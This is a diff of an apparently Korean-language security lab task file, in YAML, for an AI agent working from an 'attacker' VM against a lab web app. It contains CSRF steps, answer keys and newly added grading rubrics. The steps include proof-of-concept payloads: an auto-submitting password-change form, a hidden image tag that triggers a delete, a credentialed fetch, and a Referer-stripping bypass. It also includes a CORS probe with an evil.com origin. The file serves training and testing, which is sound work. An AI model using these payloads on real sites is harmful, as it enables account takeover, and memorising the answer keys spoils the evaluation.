@@ -19,16 +19,30 @@ steps:
   points: 8
   answer: '🤖 프롬프트: 대상 애플리케이션(http://10.20.30.80)의 폼에서 CSRF 토큰 존재 여부를 확인해줘
 
-    📎 참고 (CLI): curl -s http://10.20.30.80 | grep -i ''csrf\|_token\|hidden'' | head
-    -10 && echo ''CSRF 토큰 확인 완료'''
+    📎 참고 (CLI): curl -s http://10.20.30.80 | grep -i ''csrf\|_token\|hidden'' | head -10 && echo ''CSRF
+    토큰 확인 완료'''
   answer_detail: CSRF 토큰이 없으면 외부 사이트에서 요청을 위조할 수 있습니다.
   verify:
     type: output_contains
     expect: CSRF 토큰 확인 완료
     field: stdout
+    semantic:
+      intent: CSRF 토큰 존재 여부 확인 — 폼 HTML 에서 hidden input 또는 meta CSRF 토큰 검증
+      success_criteria:
+      - curl 로 폼 페이지 가져와 hidden input name csrf 또는 _token 검색
+      - 토큰 유무 판단 근거 제시
+      - 토큰 없을 때 CSRF 가능성 명시
+      acceptable_methods:
+      - curl <url> | grep -iE csrf_token|authenticity_token
+      - Burp Proxy 로 폼 분석
+      - browser dev tools 로 DOM 검사
+      - nikto 로 자동 탐지
+      negative_signs:
+      - 폼 수집 없이 개념만
+      - 토큰 검색 결과 없음
+      - 위험 판정 없음
   target_vm: attacker
-  script: curl -s http://10.20.30.80 | grep -i 'csrf\|_token\|hidden' | head -10 &&
-    echo 'CSRF 토큰 확인 완료'
+  script: curl -s http://10.20.30.80 | grep -i 'csrf\|_token\|hidden' | head -10 && echo 'CSRF 토큰 확인 완료'
   risk_level: low
   bastion_prompt: 대상 애플리케이션(http://10.20.30.80)의 폼에서 CSRF 토큰 존재 여부를 확인해줘
 - order: 2
@@ -39,17 +53,31 @@ steps:
   answer: '🤖 프롬프트: CSRF 공격용 HTML 페이지를 작성하시오: 패스워드 변경 요청 위조 구현 방법과 예시를 설명해줘
 
     📎 참고 (CLI): echo ''<html><body onload="document.forms[0].submit()"><form action="http://10.20.30.80/profile"
-    method="POST"><input name="password" value="hacked"></form></body></html>'' &&
-    echo ''CSRF PoC 작성 완료'''
+    method="POST"><input name="password" value="hacked"></form></body></html>'' && echo ''CSRF PoC 작성
+    완료'''
   answer_detail: 자동 제출 폼으로 사용자가 페이지를 방문하면 즉시 요청이 전송됩니다.
   verify:
     type: output_contains
     expect: CSRF PoC 작성 완료
     field: stdout
+    semantic:
+      intent: CSRF 공격 HTML 페이지 — 패스워드 변경 POST 를 자동 제출하는 hidden form
+      success_criteria:
+      - form action 에 대상 URL + POST 메서드
+      - hidden input 으로 새 비밀번호 지정
+      - body onload 자동 submit 또는 iframe src 로 자동 실행
+      acceptable_methods:
+      - HTML form body onload submit
+      - iframe srcdoc 로 내장
+      - JavaScript fetch POST
+      - BeEF module 활용
+      negative_signs:
+      - form action URL 누락
+      - 자동 submit 미설정
+      - 공격 시나리오 흐름 설명 없음
   target_vm: attacker
   script: echo '<html><body onload="document.forms[0].submit()"><form action="http://10.20.30.80/profile"
-    method="POST"><input name="password" value="hacked"></form></body></html>' &&
-    echo 'CSRF PoC 작성 완료'
+    method="POST"><input name="password" value="hacked"></form></body></html>' && echo 'CSRF PoC 작성 완료'
   risk_level: low
   bastion_prompt: 'CSRF 공격용 HTML 페이지를 작성하시오: 패스워드 변경 요청 위조.'
 - order: 3
@@ -59,16 +87,31 @@ steps:
   points: 10
   answer: '🤖 프롬프트: 이미지 태그를 이용한 GET 기반 CSRF를 구성해줘
 
-    📎 참고 (CLI): echo ''<img src="http://10.20.30.80/api/users/1/delete" style="display:none">''
-    && echo ''GET CSRF PoC 작성 완료'''
+    📎 참고 (CLI): echo ''<img src="http://10.20.30.80/api/users/1/delete" style="display:none">'' && echo
+    ''GET CSRF PoC 작성 완료'''
   answer_detail: GET 요청으로 상태 변경이 가능하면 img 태그만으로 CSRF가 가능합니다.
   verify:
     type: output_contains
     expect: GET CSRF PoC 작성 완료
     field: stdout
+    semantic:
+      intent: GET 기반 CSRF — img src 에 상태 변경 URL 넣어 이미지 로드만으로 요청 발생
+      success_criteria:
+      - img src 에 GET 변경 URL (예 /transfer?to=atk&amp;amt=1000) 포함
+      - 피해자 페이지 방문만으로 요청 발생 메커니즘 설명
+      - GET 에 상태 변경을 두면 안되는 원칙 언급
+      acceptable_methods:
+      - img src <target url>
+      - link rel prefetch
+      - iframe src
+      - CSS background-image url
+      negative_signs:
+      - POST 로 오해
+      - CSRF 원리 설명 없음
+      - RESTful 원칙 언급 없음
   target_vm: attacker
-  script: echo '<img src="http://10.20.30.80/api/users/1/delete" style="display:none">'
-    && echo 'GET CSRF PoC 작성 완료'
+  script: echo '<img src="http://10.20.30.80/api/users/1/delete" style="display:none">' && echo 'GET CSRF
+    PoC 작성 완료'
   risk_level: low
   bastion_prompt: 이미지 태그를 이용한 GET 기반 CSRF를 구성해줘
 - order: 4
@@ -85,6 +128,21 @@ steps:
     type: output_contains
     expect: AJAX CSRF 작성 완료
     field: stdout
+    semantic:
+      intent: AJAX 기반 CSRF — fetch 또는 XMLHttpRequest 로 credentials include 요청해 세션 쿠키 사용
+      success_criteria:
+      - fetch(<url>, {method:POST, credentials:include}) 형태
+      - CORS Preflight 발생 여부 분석
+      - simple request 와 preflight 요청의 구분 설명
+      acceptable_methods:
+      - fetch credentials:include
+      - XMLHttpRequest withCredentials=true
+      - axios withCredentials 설정
+      - JSONP 악용 (구형)
+      negative_signs:
+      - credentials 설정 누락
+      - CORS preflight 언급 없음
+      - JSON 엔드포인트에 단순 POST 만
   target_vm: attacker
   script: echo 'fetch(URL,{method:"POST",credentials:"include",body:JSON.stringify({email:"evil@test.com"})})'
     && echo 'AJAX CSRF 작성 완료'
@@ -97,16 +155,29 @@ steps:
   points: 10
   answer: '🤖 프롬프트: SameSite 쿠키 속성의 CSRF 방어 효과를 분석해줘
 
-    📎 참고 (CLI): curl -sI http://10.20.30.80 | grep -i ''set-cookie'' && echo ''SameSite
-    분석 완료'''
+    📎 참고 (CLI): curl -sI http://10.20.30.80 | grep -i ''set-cookie'' && echo ''SameSite 분석 완료'''
   answer_detail: SameSite=Strict는 모든 크로스사이트 요청에서 쿠키 전송을 차단합니다.
   verify:
     type: output_contains
     expect: SameSite 분석 완료
     field: stdout
+    semantic:
+      intent: SameSite 쿠키 CSRF 방어 — Strict/Lax/None 차이와 현대 브라우저 Lax 기본값 영향
+      success_criteria:
+      - SameSite Strict/Lax/None 3단계 차이 설명
+      - Lax 의 top-level GET 예외 언급
+      - Chrome 2020 이후 Lax 기본값이 CSRF 대부분 차단함 언급
+      acceptable_methods:
+      - Set-Cookie 헤더 옵션 확인
+      - OWASP Session Management
+      - Chrome Cookie Policy 문서
+      - SameSite Cookies by Scott Helme
+      negative_signs:
+      - 3단계 중 일부만 설명
+      - 기본값 변경 언급 없음
+      - None Secure 필수성 누락
   target_vm: attacker
-  script: curl -sI http://10.20.30.80 | grep -i 'set-cookie' && echo 'SameSite 분석
-    완료'
+  script: curl -sI http://10.20.30.80 | grep -i 'set-cookie' && echo 'SameSite 분석 완료'
   risk_level: low
   bastion_prompt: SameSite 쿠키 속성의 CSRF 방어 효과를 분석해줘
 - order: 6
@@ -116,16 +187,31 @@ steps:
   points: 12
   answer: '🤖 프롬프트: CSRF 토큰 검증 로직의 약점을 분석해줘
 
-    📎 참고 (CLI): echo ''=== CSRF 토큰 약점 ==='' && echo ''1. 토큰 미검증'' && echo ''2. 빈 토큰
-    허용'' && echo ''3. 토큰 재사용'' && echo ''CSRF 토큰 분석 완료'''
+    📎 참고 (CLI): echo ''=== CSRF 토큰 약점 ==='' && echo ''1. 토큰 미검증'' && echo ''2. 빈 토큰 허용'' && echo ''3.
+    토큰 재사용'' && echo ''CSRF 토큰 분석 완료'''
   answer_detail: CSRF 토큰 구현 오류로 방어가 무효화될 수 있습니다.
   verify:
     type: output_contains
     expect: CSRF 토큰 분석 완료
     field: stdout
+    semantic:
+      intent: CSRF 토큰 검증 약점 — 토큰 비교 누락, 빈 토큰 허용, GET 메서드 예외, 전역 토큰 재사용 등 결함
+      success_criteria:
+      - 최소 3가지 구현 결함 열거(비교 누락, 빈 문자열 허용, 세션 무관 토큰)
+      - Burp Repeater 로 토큰 삭제/수정 후 요청 시도
+      - 방어 (HMAC 기반 토큰, 세션 바인딩) 언급
+      acceptable_methods:
+      - Burp Repeater 로 토큰 필드 제거
+      - python requests 로 토큰 조작 테스트
+      - OWASP CSRF Prevention 가이드 참조
+      - OWASP ZAP CSRF active scan
+      negative_signs:
+      - 약점 1가지만
+      - 실제 테스트 없이 개념만
+      - 방어 방안 없음
   target_vm: attacker
-  script: echo '=== CSRF 토큰 약점 ===' && echo '1. 토큰 미검증' && echo '2. 빈 토큰 허용' && echo
-    '3. 토큰 재사용' && echo 'CSRF 토큰 분석 완료'
+  script: echo '=== CSRF 토큰 약점 ===' && echo '1. 토큰 미검증' && echo '2. 빈 토큰 허용' && echo '3. 토큰 재사용' && echo
+    'CSRF 토큰 분석 완료'
   risk_level: low
   bastion_prompt: CSRF 토큰 검증 로직의 약점을 분석해줘
 - order: 7
@@ -135,16 +221,29 @@ steps:
   points: 10
   answer: '🤖 프롬프트: Referer 헤더 기반 CSRF 방어를 우회해줘
 
-    📎 참고 (CLI): echo ''<meta name="referrer" content="no-referrer">'' && echo ''Referer
-    우회 기법 완료'''
+    📎 참고 (CLI): echo ''<meta name="referrer" content="no-referrer">'' && echo ''Referer 우회 기법 완료'''
   answer_detail: meta 태그로 Referer 전송을 방지하면 서버의 Referer 검증을 우회할 수 있습니다.
   verify:
     type: output_contains
     expect: Referer 우회 기법 완료
     field: stdout
+    semantic:
+      intent: Referer 기반 방어 우회 — Referer 헤더 삭제, data URL 사용, subdomain 스푸핑으로 우회
+      success_criteria:
+      - Referer-Policy no-referrer 적용해 헤더 제거 기법
+      - data URL 또는 HTTPS to HTTP 전환으로 Referer 미전송
+      - Referer-only 방어의 근본 한계 설명
+      acceptable_methods:
+      - meta referrer=no-referrer 또는 Referrer-Policy
+      - rel=noreferrer 링크 속성
+      - Subdomain takeover 로 Referer 위조
+      - curl -e  로 Referer 없는 요청
+      negative_signs:
+      - 헤더 조작 시도 없음
+      - 단일 우회 기법만
+      - 방어 한계 분석 없음
   target_vm: attacker
-  script: echo '<meta name="referrer" content="no-referrer">' && echo 'Referer 우회
-    기법 완료'
+  script: echo '<meta name="referrer" content="no-referrer">' && echo 'Referer 우회 기법 완료'
   risk_level: low
   bastion_prompt: Referer 헤더 기반 CSRF 방어를 우회해줘
 - order: 8
@@ -152,17 +251,32 @@ steps:
   hint: Content-Type 제한을 확인하세요.
   category: csrf_advanced
   points: 10
-  answer: "\U0001F916 프롬프트: JSON 기반 엔드포인트의 CSRF 가능성을 분석해줘\n\U0001F4CE 참고 (CLI): curl\
-    \ -s -X POST http://10.20.30.80/api/test \\\n  -H 'Content-Type: text/plain' \\\
-    \n  -d '{\"test\":1}' 2>/dev/null && echo 'JSON CSRF 분석 완료'"
+  answer: "\U0001F916 프롬프트: JSON 기반 엔드포인트의 CSRF 가능성을 분석해줘\n\U0001F4CE 참고 (CLI): curl -s -X POST http://10.20.30.80/api/test\
+    \ \\\n  -H 'Content-Type: text/plain' \\\n  -d '{\"test\":1}' 2>/dev/null && echo 'JSON CSRF 분석 완료'"
   answer_detail: 서버가 Content-Type을 검증하지 않으면 text/plain으로 JSON 데이터를 전송할 수 있습니다.
   verify:
     type: output_contains
     expect: JSON CSRF 분석 완료
     field: stdout
+    semantic:
+      intent: JSON 엔드포인트 CSRF — Content-Type application/json 요구로 simple request 불가능, 그러나 Flash/특정 우회
+        가능
+      success_criteria:
+      - JSON POST 는 simple request 아니므로 preflight 발생함 설명
+      - Content-Type text/plain 우회 또는 XHR boundary 조작 공격 벡터
+      - CSRF 토큰이 여전히 필요한 이유 언급
+      acceptable_methods:
+      - curl -H Content-Type:application/json -d {...}
+      - Flash XHR (구형) 또는 form trickery
+      - fetch 로 Content-Type 조작
+      - CORS misconfigured allow any origin 와 결합
+      negative_signs:
+      - simple vs preflight 구분 없음
+      - JSON 만으로 CSRF 완전 차단된다고 오판
+      - CORS 연계 없음
   target_vm: attacker
-  script: "curl -s -X POST http://10.20.30.80/api/test \\\n  -H 'Content-Type: text/plain'\
-    \ \\\n  -d '{\"test\":1}' 2>/dev/null && echo 'JSON CSRF 분석 완료'"
+  script: "curl -s -X POST http://10.20.30.80/api/test \\\n  -H 'Content-Type: text/plain' \\\n  -d '{\"\
+    test\":1}' 2>/dev/null && echo 'JSON CSRF 분석 완료'"
   risk_level: low
   bastion_prompt: JSON 기반 엔드포인트의 CSRF 가능성을 분석해줘
 - order: 9
@@ -170,17 +284,32 @@ steps:
   hint: Access-Control 헤더를 확인하세요.
   category: csrf_advanced
   points: 10
-  answer: "\U0001F916 프롬프트: CORS 설정과 CSRF의 관계를 분석해줘\n\U0001F4CE 참고 (CLI): curl -sI\
-    \ \\\n  -H 'Origin: http://evil.com' http://10.20.30.80 \\\n | grep -i 'access-control'\
-    \ && echo 'CORS 분석 완료' || echo 'CORS 미설정 확인 완료'"
+  answer: "\U0001F916 프롬프트: CORS 설정과 CSRF의 관계를 분석해줘\n\U0001F4CE 참고 (CLI): curl -sI \\\n  -H 'Origin: http://evil.com'\
+    \ http://10.20.30.80 \\\n | grep -i 'access-control' && echo 'CORS 분석 완료' || echo 'CORS 미설정 확인 완료'"
   answer_detail: CORS 와일드카드(*)는 credentials와 함께 사용 불가하지만 특정 Origin 반사는 위험합니다.
   verify:
     type: output_contains
     expect: 완료
     field: stdout
+    semantic:
+      intent: CORS 설정과 CSRF 관계 — Access-Control-Allow-Credentials true + Allow-Origin wildcard/reflection
+        시 CSRF 심화
+      success_criteria:
+      - preflight 없는 simple request 와 preflight 요구 차이
+      - ACAO wildcard + credentials 불가 원칙
+      - 반사형 Origin 정책 취약점 및 subdomain takeover 연계
+      acceptable_methods:
+      - curl -H Origin:https://evil.com <url>
+      - corsy 자동 스캐너
+      - Burp CORS * scanner
+      - Mozilla CORS 문서
+      negative_signs:
+      - CORS 만 언급하고 CSRF 연결 없음
+      - credentials 규칙 설명 없음
+      - Origin 반사 위험 누락
   target_vm: attacker
-  script: "curl -sI \\\n  -H 'Origin: http://evil.com' http://10.20.30.80 \\\n | grep\
-    \ -i 'access-control' && echo 'CORS 분석 완료' || echo 'CORS 미설정 확인 완료'"
+  script: "curl -sI \\\n  -H 'Origin: http://evil.com' http://10.20.30.80 \\\n | grep -i 'access-control'\
+    \ && echo 'CORS 분석 완료' || echo 'CORS 미설정 확인 완료'"
   risk_level: low
   bastion_prompt: CORS 설정과 CSRF의 관계를 분석해줘
 - order: 10
@@ -190,16 +319,31 @@ steps:
   points: 10
   answer: '🤖 프롬프트: CSRF와 XSS 체인 공격을 구현 방법을 설명하고 예시 코드를 보여줘
 
-    📎 참고 (CLI): echo ''=== XSS+CSRF 체인 ==='' && echo ''1. XSS로 CSRF 토큰 읽기'' && echo
-    ''2. 탈취 토큰으로 CSRF 요청'' && echo ''3. 방어 우회 성공'' && echo ''체인 공격 설계 완료'''
+    📎 참고 (CLI): echo ''=== XSS+CSRF 체인 ==='' && echo ''1. XSS로 CSRF 토큰 읽기'' && echo ''2. 탈취 토큰으로 CSRF
+    요청'' && echo ''3. 방어 우회 성공'' && echo ''체인 공격 설계 완료'''
   answer_detail: XSS가 존재하면 CSRF 토큰 방어가 무효화됩니다.
   verify:
     type: output_contains
     expect: 체인 공격 설계 완료
     field: stdout
+    semantic:
+      intent: CSRF + XSS 체인 — XSS 로 CSRF 토큰 조회 후 악성 요청 전송 (Same-Origin 정책 하에서 가능)
+      success_criteria:
+      - XSS 로 토큰 DOM 조회 JS 예시 (document.querySelector)
+      - 토큰을 포함한 fetch/XHR 로 상태 변경 요청
+      - XSS 가 있으면 CSRF 방어가 무력화됨 설명
+      acceptable_methods:
+      - document.querySelector to read token
+      - fetch with token in headers
+      - BeEF 모듈 exploit chain
+      - XSSHunter + custom payload
+      negative_signs:
+      - XSS 없이 CSRF 만
+      - 토큰 조회 메커니즘 누락
+      - 체인 공격 흐름 설명 없음
   target_vm: attacker
-  script: echo '=== XSS+CSRF 체인 ===' && echo '1. XSS로 CSRF 토큰 읽기' && echo '2. 탈취 토큰으로
-    CSRF 요청' && echo '3. 방어 우회 성공' && echo '체인 공격 설계 완료'
+  script: echo '=== XSS+CSRF 체인 ===' && echo '1. XSS로 CSRF 토큰 읽기' && echo '2. 탈취 토큰으로 CSRF 요청' && echo
+    '3. 방어 우회 성공' && echo '체인 공격 설계 완료'
   risk_level: low
   bastion_prompt: CSRF와 XSS 체인 공격을 설계하시오.
 - order: 11
@@ -209,17 +353,31 @@ steps:
   points: 10
   answer: '🤖 프롬프트: Double Submit Cookie 방어 기법을 분석해줘
 
-    📎 참고 (CLI): echo ''=== Double Submit Cookie ==='' && echo ''1. 서버가 랜덤 토큰을 쿠키로
-    설정'' && echo ''2. 클라이언트가 헤더에 복사'' && echo ''3. 서버가 일치 확인'' && echo ''Double Submit
-    분석 완료'''
+    📎 참고 (CLI): echo ''=== Double Submit Cookie ==='' && echo ''1. 서버가 랜덤 토큰을 쿠키로 설정'' && echo ''2. 클라이언트가
+    헤더에 복사'' && echo ''3. 서버가 일치 확인'' && echo ''Double Submit 분석 완료'''
   answer_detail: 크로스사이트에서는 쿠키 값을 읽을 수 없으므로 헤더에 복사할 수 없습니다.
   verify:
     type: output_contains
     expect: Double Submit 분석 완료
     field: stdout
+    semantic:
+      intent: Double Submit Cookie — 쿠키 토큰과 헤더/폼 토큰 일치 검증, 서버 세션 저장 불필요한 Stateless 방식
+      success_criteria:
+      - 쿠키 토큰 + X-CSRF-Token 헤더 동시 전송 구조 설명
+      - HttpOnly 쿠키면 JS 가 읽을 수 없어 공격자 토큰 생성 불가 원리
+      - 한계(subdomain 쿠키 변조 위험) 언급
+      acceptable_methods:
+      - OWASP Double Submit Cookie 가이드
+      - Django/Rails 구현 예시
+      - Cloudflare __cf_bm 유사 구조
+      - Signed Double Submit 변형
+      negative_signs:
+      - Synchronizer Token 과 혼동
+      - HttpOnly 역할 설명 없음
+      - Stateless 이점 누락
   target_vm: attacker
-  script: echo '=== Double Submit Cookie ===' && echo '1. 서버가 랜덤 토큰을 쿠키로 설정' && echo
-    '2. 클라이언트가 헤더에 복사' && echo '3. 서버가 일치 확인' && echo 'Double Submit 분석 완료'
+  script: echo '=== Double Submit Cookie ===' && echo '1. 서버가 랜덤 토큰을 쿠키로 설정' && echo '2. 클라이언트가 헤더에 복사'
+    && echo '3. 서버가 일치 확인' && echo 'Double Submit 분석 완료'
   risk_level: low
   bastion_prompt: Double Submit Cookie 방어 기법을 분석해줘
 - order: 12
@@ -229,16 +387,32 @@ steps:
   points: 10
   answer: '🤖 프롬프트: 프레임워크별 CSRF 방어 기능을 비교해줘
 
-    📎 참고 (CLI): echo ''=== 프레임워크 CSRF 방어 ==='' && echo ''Django: csrf_token'' && echo
-    ''Spring: CsrfFilter'' && echo ''Express: csurf'' && echo ''프레임워크 비교 완료'''
+    📎 참고 (CLI): echo ''=== 프레임워크 CSRF 방어 ==='' && echo ''Django: csrf_token'' && echo ''Spring: CsrfFilter''
+    && echo ''Express: csurf'' && echo ''프레임워크 비교 완료'''
   answer_detail: 대부분의 현대 프레임워크는 CSRF 방어를 내장하고 있습니다.
   verify:
     type: output_contains
     expect: 프레임워크 비교 완료
     field: stdout
+    semantic:
+      intent: 프레임워크별 CSRF 방어 — Django csrf_token, Rails authenticity_token, Spring CsrfFilter, Express
+        csurf 비교
+      success_criteria:
+      - 3개 이상 프레임워크의 CSRF 방어 기능 이름과 활성화 방법
+      - 자동 vs 수동 토큰 삽입 차이
+      - 취약 설정(disable_csrf) 언급
+      acceptable_methods:
+      - 표 형식 프레임워크 비교
+      - 각 docs 링크 참조
+      - SAST 로 disable 코드 탐지
+      - 코드 레벨 예시
+      negative_signs:
+      - 단일 프레임워크만
+      - 활성화/비활성화 구분 없음
+      - 기본값 안전 여부 불명
   target_vm: attacker
-  script: 'echo ''=== 프레임워크 CSRF 방어 ==='' && echo ''Django: csrf_token'' && echo ''Spring:
-    CsrfFilter'' && echo ''Express: csurf'' && echo ''프레임워크 비교 완료'''
+  script: 'echo ''=== 프레임워크 CSRF 방어 ==='' && echo ''Django: csrf_token'' && echo ''Spring: CsrfFilter''
+    && echo ''Express: csurf'' && echo ''프레임워크 비교 완료'''
   risk_level: low
   bastion_prompt: 프레임워크별 CSRF 방어 기능을 비교해줘
 - order: 13
@@ -254,6 +428,21 @@ steps:
     type: output_contains
     expect: 자동 탐지 완료
     field: stdout
+    semantic:
+      intent: CSRF 자동 탐지 — ZAP/Burp active scan, csrfprobe 등 도구로 폼·엔드포인트 자동 점검
+      success_criteria:
+      - 최소 1개 도구 실행 예시 (ZAP 또는 Burp)
+      - 탐지 로직(토큰 제거 후 요청 성공 여부) 설명
+      - False positive 방지 전략
+      acceptable_methods:
+      - OWASP ZAP CSRF scan rule
+      - Burp Suite Pro active scan
+      - csrfprobe 또는 xsrfprobe
+      - python 스크립트로 폼 자동 수집 후 토큰 제거 시도
+      negative_signs:
+      - 수동 탐지만 언급
+      - False positive 관점 없음
+      - 도구 실행 결과 해석 없음
   target_vm: attacker
   script: 'echo ''자동 CSRF 탐지: 폼 분석 -> 토큰 검사 -> 결과'' && echo ''자동 탐지 완료'''
   risk_level: low
@@ -265,17 +454,31 @@ steps:
   points: 12
   answer: '🤖 프롬프트: CSRF 방어 권고사항을 종합 정리해줘
 
-    📎 참고 (CLI): echo ''=== CSRF 방어 권고 ==='' && echo ''1. CSRF 토큰 적용'' && echo ''2.
-    SameSite=Strict'' && echo ''3. Referer 검증'' && echo ''4. CORS 제한'' && echo ''CSRF
-    방어 정리 완료'''
+    📎 참고 (CLI): echo ''=== CSRF 방어 권고 ==='' && echo ''1. CSRF 토큰 적용'' && echo ''2. SameSite=Strict'' &&
+    echo ''3. Referer 검증'' && echo ''4. CORS 제한'' && echo ''CSRF 방어 정리 완료'''
   answer_detail: 다층 CSRF 방어가 필요합니다.
   verify:
     type: output_contains
     expect: CSRF 방어 정리 완료
     field: stdout
+    semantic:
+      intent: CSRF 방어 권고 종합 — SameSite Lax/Strict + CSRF 토큰 + Origin/Referer 검증 다층 방어
+      success_criteria:
+      - 최소 3개 방어 계층 (쿠키/토큰/Origin) 조합 제안
+      - 민감 작업 재인증(step-up auth) 포함
+      - 모니터링·이상 탐지 운영적 방어 언급
+      acceptable_methods:
+      - OWASP CSRF Prevention Cheat Sheet 룰 1-4
+      - NIST SP 800-63 재인증 지침
+      - CI/CD 스캔 통합
+      - WAF CSRF 룰
+      negative_signs:
+      - 단일 방어만
+      - 민감 작업 재인증 누락
+      - 모니터링 없음
   target_vm: attacker
-  script: echo '=== CSRF 방어 권고 ===' && echo '1. CSRF 토큰 적용' && echo '2. SameSite=Strict'
-    && echo '3. Referer 검증' && echo '4. CORS 제한' && echo 'CSRF 방어 정리 완료'
+  script: echo '=== CSRF 방어 권고 ===' && echo '1. CSRF 토큰 적용' && echo '2. SameSite=Strict' && echo '3. Referer
+    검증' && echo '4. CORS 제한' && echo 'CSRF 방어 정리 완료'
   risk_level: low
   bastion_prompt: CSRF 방어 권고사항을 종합 정리해줘
 - order: 15
@@ -285,26 +488,38 @@ steps:
   points: 8
   answer: '🤖 프롬프트: CSRF 실습 종합 보고서를 구현 방법을 설명하고 예시 코드를 보여줘
 
-    📎 참고 (CLI): echo ''=== CSRF 분석 보고서 ==='' && echo ''대상: http://10.20.30.80'' &&
-    echo ''발견: CSRF 토큰 미적용'' && echo ''영향: 설정/패스워드 변경'' && echo ''조치: 토큰 + SameSite''
-    && echo ''=== 보고서 완료 ==='''
+    📎 참고 (CLI): echo ''=== CSRF 분석 보고서 ==='' && echo ''대상: http://10.20.30.80'' && echo ''발견: CSRF 토큰
+    미적용'' && echo ''영향: 설정/패스워드 변경'' && echo ''조치: 토큰 + SameSite'' && echo ''=== 보고서 완료 ==='''
   answer_detail: CSRF 보고서는 PoC와 재현 절차를 반드시 포함해야 합니다.
   verify:
     type: output_contains
     expect: 보고서 완료
     field: stdout
+    semantic:
+      intent: CSRF 실습 종합 보고서 — 탐지·Exploit·방어·자동화 결과를 /tmp/csrf_report.txt 로 정리
+      success_criteria:
+      - 4 섹션 이상 (폼/토큰/SameSite/CORS 연계)
+      - PoC HTML/URL 최소 1개 포함
+      - 파일 저장 후 cat 확인
+      acceptable_methods:
+      - heredoc markdown
+      - echo -e 다줄
+      - json/yaml 구조화
+      - python 템플릿
+      negative_signs:
+      - 섹션 2 미만
+      - PoC 없음
+      - 파일 저장 없음
   target_vm: attacker
-  script: 'echo ''=== CSRF 분석 보고서 ==='' && echo ''대상: http://10.20.30.80'' && echo
-    ''발견: CSRF 토큰 미적용'' && echo ''영향: 설정/패스워드 변경'' && echo ''조치: 토큰 + SameSite'' &&
-    echo ''=== 보고서 완료 ==='''
+  script: 'echo ''=== CSRF 분석 보고서 ==='' && echo ''대상: http://10.20.30.80'' && echo ''발견: CSRF 토큰 미적용''
+    && echo ''영향: 설정/패스워드 변경'' && echo ''조치: 토큰 + SameSite'' && echo ''=== 보고서 완료 ==='''
   risk_level: low
   bastion_prompt: CSRF 실습 종합 보고서를 작성하시오.
 - order: 99
   instruction: '[Multi-task] 이번 주 핵심 작업 5개를 한 번에 수행하라.'
-  bastion_prompt: "attacker VM에서 다음 작업들을 순서대로 수행해줘:\n1) 대상 애플리케이션(http://10.20.30.80)의\
-    \ 폼에서 CSRF 토큰 존재 여부를 확인해줘\n2) CSRF 공격용 HTML 페이지를 작성하시오: 패스워드 변경 요청 위조 \n3) 이미지\
-    \ 태그를 이용한 GET 기반 CSRF를 구성해줘\n4) AJAX 기반 CSRF를 작성하시오: fetch API 활용 \n5) SameSite\
-    \ 쿠키 속성의 CSRF 방어 효과를 분석 작업을 수행해줘"
+  bastion_prompt: "attacker VM에서 다음 작업들을 순서대로 수행해줘:\n1) 대상 애플리케이션(http://10.20.30.80)의 폼에서 CSRF 토큰 존재\
+    \ 여부를 확인해줘\n2) CSRF 공격용 HTML 페이지를 작성하시오: 패스워드 변경 요청 위조 \n3) 이미지 태그를 이용한 GET 기반 CSRF를 구성해줘\n4) AJAX\
+    \ 기반 CSRF를 작성하시오: fetch API 활용 \n5) SameSite 쿠키 속성의 CSRF 방어 효과를 분석 작업을 수행해줘"
   hint: 복합 작업은 Bastion이 순서대로 계획하고 실행해야 한다
   category: multi_task
   points: 50
@@ -314,10 +529,8 @@ steps:
     field: stdout
   target_vm: attacker
   risk_level: low
-  answer: "\U0001F916 프롬프트: attacker VM에서 다음 작업들을 순서대로 수행해줘:\n1) 대상 애플리케이션(http://10.20.30.80)의\
-    \ 폼에서 CSRF 토큰 존재 여부를 확인해줘\n2) CSRF 공격용 HTML 페이지를 작성하시오: 패스워드 변경 요청 위조 \n3) 이미지\
-    \ 태그를 이용한 GET 기반 CSRF를 구성해줘\n4) AJAX 기반 CSRF를 작성하시오: fetch API 활용 \n5) SameSite\
-    \ 쿠키 속성의 CSRF 방어 효과를 분석 작업을 수행해줘"
-  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
-    다단계 작업.
+  answer: "\U0001F916 프롬프트: attacker VM에서 다음 작업들을 순서대로 수행해줘:\n1) 대상 애플리케이션(http://10.20.30.80)의 폼에서 CSRF\
+    \ 토큰 존재 여부를 확인해줘\n2) CSRF 공격용 HTML 페이지를 작성하시오: 패스워드 변경 요청 위조 \n3) 이미지 태그를 이용한 GET 기반 CSRF를 구성해줘\n\
+    4) AJAX 기반 CSRF를 작성하시오: fetch API 활용 \n5) SameSite 쿠키 속성의 CSRF 방어 효과를 분석 작업을 수행해줘"
+  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는 다단계 작업.
   script: ''
